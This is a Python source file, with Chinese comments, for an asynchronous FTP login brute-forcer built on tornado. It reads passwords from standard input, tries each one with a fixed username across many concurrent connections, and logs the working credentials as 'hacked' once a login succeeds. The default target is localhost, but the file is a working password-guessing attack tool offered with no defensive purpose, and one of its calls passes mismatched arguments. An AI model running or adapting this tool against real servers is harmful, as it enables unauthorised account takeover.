#!/usr/bin/env python
# encoding=utf-8
'''
ftp 登陆，用 tornado 写成异步
author: dawn110110
'''
from tornado.iostream import IOStream
from tornado.log import LogFormatter
import logging
import tornado
import socket
import sys

from ftplib import CRLF

def get_pairs():
    for i in sys.stdin:
        yield 'ssdut', i.rstrip('\n')

p = get_pairs()

def get_one():
    item = p.next()
    return item

class FtpWorker(object):
    """ 目前只做3件，1. connect 2. 获取welcome 信息 3. 尝试登陆
        基本上是 ftplib 里的同步的代码改的，所以看起来很像
    """

    def __init__(self, serv_addr, bomber):
        self.bomber = bomber
        logging.debug('FtpWorker init, serv_addr = (%r, %r)' % serv_addr)
        self._recved_lines = []
        self.serv_addr = serv_addr
        self.setup_connection()


    def setup_connection(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.stream = IOStream(self.sock)
        self.stream.connect(self.serv_addr, self.on_connected)
        self.stream.set_close_callback(self.on_connection_close)

    def on_connection_close(self):
        try:
            self.sock.close()
        except:
            pass
        self.setup_connection()

    def on_connected(self):
        logging.debug('connected, serv_addr = %s' % repr(self.serv_addr))
        self.read_until_multi_line(self.on_welcome)

    def on_welcome(self, msg):
        logging.debug('get welcome msg succeeded, msg = %r' % msg)
        u, p = get_one()
        self.try_login(u, p)

    def read_until_line(self, callback):
        def _callback(data):
            if not data:
                logging.debug('data = %r' % data)
                return
            if data[-2:] == CRLF:
                line = data[:-2]
            elif data[-1:] in CRLF:
                line = data[:-1]
            logging.debug('line recved: %r, callback = %r will be called' % (line, callback))
            callback(line)
        self.stream.read_until('\n', _callback)

    def read_until_line_with_code(self, code, callback):
        def _on_line(data):
            if data[:3] == code and data[3:4] != '-':
                self._recved_lines.append(data)
                joined = '\n'.join(self._recved_lines)
                logging.debug('line with code recved: data = %r, code = %r, callback = %r will be called' % (data, code, callback))
                callback(joined)
                self._recved_lines = []
            else:
                logging.debug('line recved, but no code in it: data = %r, code = %r' % (data, code))
                self._recved_lines.append(data)
                self.read_until_line(_on_line)
        self.read_until_line(_on_line)

    def read_until_multi_line(self, callback):
        def _on_first_line(data):
            if data[3:4] == '-':
                code = data[:3]
                self._recved_lines.append(data)
                logging.debug('1st line of multi recved: data = %r, code = %r' % (data, code))
                self.read_until_line_with_code(callback, code, callback)
            else:
                logging.debug('1st line of multi recved: data = %r, callback = %r will be called' % (data, callback))
                callback(data)
                self._recved_lines = []
        self.read_until_line(_on_first_line)

    def putcmd(self, line, callback):
        line = line + CRLF
        logging.debug('send: %r' % line)
        self.stream.write(line, callback)

    def sendcmd(self, line, callback):
        def _callback():
            self.read_until_multi_line(callback)
        self.putcmd(line, _callback)

    def try_login(self, user = '', passwd = '', acct = ''):
        ''' 尝试登陆 '''
        if not user: user = 'anonymous'
        if not passwd: passwd = ''
        if not acct: acct = ''
        if user == 'anonymous' and passwd in ('', '-'):
            passwd = passwd + 'anonymous@'

        def _on_fail(resp):
            logging.error("login fail: (%r, %r, %r), server_response = %r" % (user, passwd, acct, resp))
            u, p = get_one()
            self.try_login(u, p)

        def _on_succ(resp):
            self.on_hacked(user, passwd, acct)

        def _on_resp_3_after_PASS(resp):
            '''when server reply 3xx after PASS cmd'''
            logging.debug('PASS cmd reply: %r' % resp)
            self.sendcmd('ACCT ' + acct,
                    lambda r: _on_succ(r) if r[0] == '2' else \
                              _on_fail(r))

        def _on_resp_3_after_USER(resp):
            '''when server reply 331 after USER cmd'''
            logging.debug('USER cmd reply: %r' % resp)
            self.sendcmd('PASS ' + passwd,
                    lambda r: _on_resp_3_after_PASS(r) if r[0] == '3' else \
                              _on_succ(r) if r[0] == '2' else \
                              _on_fail(r))

        logging.debug("beging trying login: user = %r, passwd = %r, acct = %r" % (user, passwd, acct))
        self.sendcmd('USER ' + user,
                lambda r: _on_resp_3_after_USER(r) if r[0] == '3' else \
                          _on_fail(r))

    def on_hacked(self, user, passwd, acct):
        logging.info("right user & pw found: user: %r, passwd: %r, acct: %r" % (user, passwd, acct))
        self.bomber.shutdown()


class Bomber(object):
    """ 下一步实现这个 """
    def __init__(self):
        self.workers = [FtpWorker(('127.0.0.1', 5000), self) for i in range(self.get_resonable_worker_num())]
        self._setup_log()

    def get_resonable_worker_num(self):
        """可打开文件总数的1/2"""
        import resource
        return int(resource.getrlimit(resource.RLIMIT_NOFILE)[0]/2)

    def fire_out(self):
        tornado.ioloop.IOLoop.instance().start()

    def shutdown(self):
        logging.debug('the bomber will shutdown now')
        tornado.ioloop.IOLoop.instance().stop()

    def _setup_log(self):
        """ setup my own logger, as ./fireftp.log """
        self._enable_pretty_logging(logging.INFO, "./fireftp.log")


    def _enable_pretty_logging(self, level, log_file_prefix,
                               logger=None, backupCount=10,
                               maxBytes=10000000, log_to_stderr=True):
        """ modified from tornado.log.enable_pretty_logging, 
            difference is this one does not use options of tornado
        """
        if logger is None:
            logger = logging.getLogger()
        logger.handlers = []  # remove other handlers...
        logger.setLevel(level)
        channel = logging.handlers.RotatingFileHandler(
            filename=log_file_prefix,
            maxBytes=maxBytes,
            backupCount=backupCount)
        channel.setFormatter(LogFormatter(color=False))
        logger.addHandler(channel)

        if (log_to_stderr or
                (log_to_stderr is None and not logger.handlers)):
            # Set up color if we are in a tty and curses is installed
            channel = logging.StreamHandler()
            channel.setFormatter(LogFormatter())
            logger.addHandler(channel)


def main():
    bomber = Bomber()
    bomber.fire_out()

if __name__ == "__main__":
    main()
